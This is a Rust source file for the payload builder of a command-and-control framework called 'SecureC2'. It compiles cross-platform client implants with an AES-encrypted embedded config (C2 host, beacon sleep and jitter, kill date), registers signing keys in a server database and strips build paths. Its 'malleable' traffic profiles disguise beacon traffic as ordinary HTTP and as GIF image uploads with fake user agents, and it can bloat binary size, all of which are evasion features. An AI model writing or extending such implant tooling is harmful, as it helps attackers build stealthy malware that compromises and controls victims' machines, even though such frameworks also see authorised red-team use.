// src/bin/builder.rs
use clap::{Parser, ValueEnum};
use std::process::Command;
use std::fs;
use std::path::PathBuf;
use ed25519_dalek::SigningKey;
use rand::rngs::OsRng;
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
use uuid::Uuid;
use serde_json::json;
use anyhow::{Context, Result};
use rusqlite::Connection;
use chrono::{Utc, Duration};
use aes_gcm::{
    aead::{Aead, AeadCore, KeyInit, OsRng as CryptoOsRng},
    Aes256Gcm
};
use std::collections::HashMap;

// Import Malleable Types from the library
use secure_c2::common::{MalleableProfile, HttpBlock, TransformStep};

#[derive(Parser)]
#[command(name = "C2 Builder")]
#[command(author = "SecureC2")]
#[command(version = "2.0")]
struct Cli {
    #[arg(long, default_value = "127.0.0.1")] host: String,
    
    // IP Port or Pipe Name
    #[arg(long, default_value = "4443")] port: String,

    #[arg(long, value_enum, default_value_t = Platform::Linux)] platform: Platform,
    #[arg(long, value_enum, default_value_t = Transport::Tls)] transport: Transport,
    
    // [UPDATED] Legacy quick-select profile (overridden if --profile-file is used)
    #[arg(long, value_enum, default_value_t = ProfileArg::Default)] profile: ProfileArg,

    // [NEW] Path to a Malleable C2 JSON profile
    #[arg(long)] profile_file: Option<String>,
    
    #[arg(long, default_value_t = 40)] sleep: u64,
    #[arg(long, default_value_t = 20)] jitter_min: u32,
    #[arg(long, default_value_t = 10)] jitter_max: u32,
    #[arg(long, default_value_t = 0)] bloat: u64,
    #[arg(long, default_value_t = false)] debug: bool,
    #[arg(long, default_value_t = 0)] days: i64,
}

#[derive(Copy, Clone, PartialEq, Eq, PartialOrd, Ord, ValueEnum, Debug)]
enum Platform { Linux, Windows, Macos }

#[derive(Copy, Clone, PartialEq, Eq, PartialOrd, Ord, ValueEnum, Debug)]
enum Transport { Tls, TcpPlain, NamedPipe }

#[derive(Copy, Clone, PartialEq, Eq, PartialOrd, Ord, ValueEnum, Debug)]
enum ProfileArg { Default, HttpPost, HttpImage }

fn main() -> Result<()> {
    let cli = Cli::parse();

    println!("\n=== SecureC2 Builder v2.0 (Malleable) ===");
    println!("[*] Target:      {}", cli.host);
    println!("[*] Port/Pipe:   {}", cli.port);

    if cli.jitter_min > 100 { anyhow::bail!("Jitter Min cannot exceed 100%."); }

    // 1. Resolve Profile (File vs Built-in)
    let final_profile = if let Some(path) = &cli.profile_file {
        println!("[*] Loading Profile: {}", path);
        let content = fs::read_to_string(path).context("Failed to read profile file")?;
        serde_json::from_str::<MalleableProfile>(&content).context("Invalid Profile JSON format")?
    } else {
        println!("[*] Using Built-in Profile: {:?}", cli.profile);
        construct_builtin_profile(&cli.profile)
    };

    println!("[*] Profile Name: {}", final_profile.name);

    let kill_ts = if cli.days > 0 {
        Some(Utc::now().checked_add_signed(Duration::days(cli.days)).unwrap().timestamp())
    } else { None };

    let build_id = Uuid::new_v4().to_string();
    let hash_salt = Uuid::new_v4().to_string();
    println!("[*] Build ID:     {}", build_id);

    // 2. Crypto Setup
    let mut csprng = OsRng;
    let signing_key = SigningKey::generate(&mut csprng);
    let verify_key = signing_key.verifying_key();
    let pub_key_b64 = BASE64.encode(verify_key.to_bytes());
    
    // 3. Save Server Artifacts
    // NOTE: We now save the FULL profile JSON so the server knows how to decode traffic for this build
    save_server_artifacts(&build_id, &signing_key, &final_profile)?;

    if let Err(e) = try_update_local_db(&build_id, &signing_key, &final_profile) {
        println!("[!] Could not auto-update local DB: {}", e);
        println!("[*] Import 'dist/server_keys.json' manually.");
    }

    // 4. Handle Config Construction
    let port_u16 = if cli.transport == Transport::NamedPipe {
        0 
    } else {
        cli.port.parse::<u16>().context("Port must be a number for TCP/TLS")?
    };

    let final_host = if cli.transport == Transport::NamedPipe {
        format!("{}:{}", cli.host, cli.port)
    } else {
        cli.host.clone()
    };

    let config_json = json!({
        "transport": match cli.transport { 
            Transport::Tls => "tls", 
            Transport::TcpPlain => "tcp_plain",
            Transport::NamedPipe => "named_pipe" 
        },
        "profile": final_profile, // Embed the full Malleable struct
        "c2_host": final_host,
        "tunnel_port": port_u16,
        "sleep_interval": cli.sleep,
        "jitter_min": cli.jitter_min,
        "jitter_max": cli.jitter_max,
        "bloat_mb": cli.bloat,
        "debug": cli.debug,
        "server_public_key": pub_key_b64,
        "hash_salt": hash_salt,
        "build_id": build_id,
        "kill_date": kill_ts
    }).to_string();

    println!("[*] Encrypting configuration...");
    let key = Aes256Gcm::generate_key(&mut CryptoOsRng);
    let cipher = Aes256Gcm::new(&key);
    let nonce = Aes256Gcm::generate_nonce(&mut CryptoOsRng);
    let ciphertext = cipher.encrypt(&nonce, config_json.as_bytes())
        .map_err(|e| anyhow::anyhow!("Encryption failed: {}", e))?;

    let build_env_json = json!({
        "encrypted": true,
        "key_hex": hex::encode(key),
        "nonce_hex": hex::encode(nonce),
        "cipher_hex": hex::encode(ciphertext),
        "bloat_mb": cli.bloat 
    }).to_string();

    // 5. Compile
    let (target, ext) = match cli.platform {
        Platform::Linux => ("x86_64-unknown-linux-gnu", ""),
        Platform::Windows => ("x86_64-pc-windows-gnu", ".exe"),
        Platform::Macos => ("x86_64-apple-darwin", ""),
    };

    let current_dir = std::env::current_dir()?.to_string_lossy().to_string();
    let cargo_home = std::env::var("CARGO_HOME").unwrap_or_else(|_| {
        let home = std::env::var("HOME").unwrap_or_default();
        format!("{}/.cargo", home)
    });

    println!("[*] Compiling client for {}...", target);
    let status = Command::new("cargo")
        .args(["build", "--bin", "client", "--release", "--target", target])
        .env("C2_BUILD_CONFIG", &build_env_json)
        .env("RUSTFLAGS", format!("--remap-path-prefix {}={} --remap-path-prefix {}={}", current_dir, "/src", cargo_home, "/cargo"))
        .status().context("Build failed")?;

    if !status.success() { anyhow::bail!("Compilation failed."); }

    let src_path = PathBuf::from(format!("target/{}/release/client{}", target, ext));
    fs::create_dir_all("dist")?;
    
    let platform_name = cli.platform.to_possible_value().unwrap().get_name().to_string();
    
    let dest_path = PathBuf::from(format!("dist/client_{}_{}{}", platform_name, build_id.chars().take(8).collect::<String>(), ext));

    if src_path.exists() {
        fs::copy(&src_path, &dest_path)?;
        println!("\n[+] Build Success!");
        println!("[+] Binary: {}", dest_path.display());
        println!("[+] Profile: {}", final_profile.name);
    } else {
        anyhow::bail!("Artifact not found at {}", src_path.display());
    }

    Ok(())
}

fn save_server_artifacts(build_id: &str, key: &SigningKey, profile: &MalleableProfile) -> Result<()> {
    fs::create_dir_all("dist")?;
    let key_b64 = BASE64.encode(key.to_bytes());
    
    // Store profile in DB for the server to use
    let profile_json = serde_json::to_string(profile)?;

    let import_data = json!({
        "build_id": build_id,
        "private_key": key_b64,
        "profile_data": profile_json,
        "note": "Import this into the server database table 'build_keys'"
    });
    fs::write("dist/server_keys.json", serde_json::to_string_pretty(&import_data)?)?;
    Ok(())
}

fn try_update_local_db(build_id: &str, key: &SigningKey, profile: &MalleableProfile) -> Result<()> {
    let db_path = "c2_audit.db";
    let conn = Connection::open(db_path)?;
    
    // Ensure table exists with profile_data column
    // Note: Older schema used 'profile' (text name). New schema should use 'profile_data' (json blob).
    // For migration compatibility, we might still populate 'profile' with the name.
    conn.execute(
        "CREATE TABLE IF NOT EXISTS build_keys (
            build_id TEXT PRIMARY KEY,
            private_key BLOB,
            profile TEXT DEFAULT 'default',
            profile_data TEXT 
        )",
        [],
    )?;

    // Check if profile_data column exists, if not add it (simple migration)
    let col_count: i32 = conn.query_row(
        "SELECT count(*) FROM pragma_table_info('build_keys') WHERE name='profile_data'", 
        [], 
        |r| r.get(0)
    ).unwrap_or(0);

    if col_count == 0 {
        let _ = conn.execute("ALTER TABLE build_keys ADD COLUMN profile_data TEXT", []);
    }

    let profile_json = serde_json::to_string(profile)?;

    conn.execute(
        "INSERT OR REPLACE INTO build_keys (build_id, private_key, profile, profile_data) VALUES (?1, ?2, ?3, ?4)",
        rusqlite::params![build_id, key.to_bytes(), profile.name, profile_json],
    )?;

    println!("[+] Automatically registered Build ID '{}' (Profile: {}) in local database.", build_id, profile.name);
    Ok(())
}

// Helper to generate the old hardcoded profiles dynamically
fn construct_builtin_profile(arg: &ProfileArg) -> MalleableProfile {
    match arg {
        ProfileArg::Default => MalleableProfile::default(),
        ProfileArg::HttpPost => {
            let mut headers = HashMap::new();
            headers.insert("Content-Type".into(), "application/octet-stream".into());
            headers.insert("Accept".into(), "*/*".into());

            MalleableProfile {
                name: "legacy_http_post".into(),
                user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Legacy/1.0".into(),
                format_http: true,
                http_get: HttpBlock {
                    uris: vec!["/api/v1/sync".into()],
                    headers: headers.clone(),
                    data_transform: vec![TransformStep::Base64],
                },
                http_post: HttpBlock {
                    uris: vec!["/api/v1/sync".into()],
                    headers,
                    // Legacy behavior: The old hardcoded traffic didn't actually transform data much besides framing.
                    // We'll add Base64 to mimic basic encoding.
                    data_transform: vec![TransformStep::Base64],
                }
            }
        },
        ProfileArg::HttpImage => {
            let mut headers = HashMap::new();
            headers.insert("Content-Type".into(), "image/gif".into());
            
            // [FIX] Use valid UTF-8 string for GIF magic bytes.
            // Raw bytes like \x80 are invalid in Rust Strings.
            // "GIF89a" is the standard text signature.
            let gif_magic = "GIF89a".to_string();

            MalleableProfile {
                name: "legacy_http_image".into(),
                user_agent: "Mozilla/5.0 (Compatible; ImageFetcher/1.0)".into(),
                format_http: true,
                http_get: HttpBlock {
                    uris: vec!["/image.gif".into()],
                    headers: headers.clone(),
                    data_transform: vec![TransformStep::Append(gif_magic.clone())], // Fake append logic for GET?
                },
                http_post: HttpBlock {
                    uris: vec!["/upload.gif".into()],
                    headers,
                    data_transform: vec![
                        TransformStep::Prepend(gif_magic) // Prepend GIF header to make it look like an image
                    ],
                }
            }
        }
    }
}
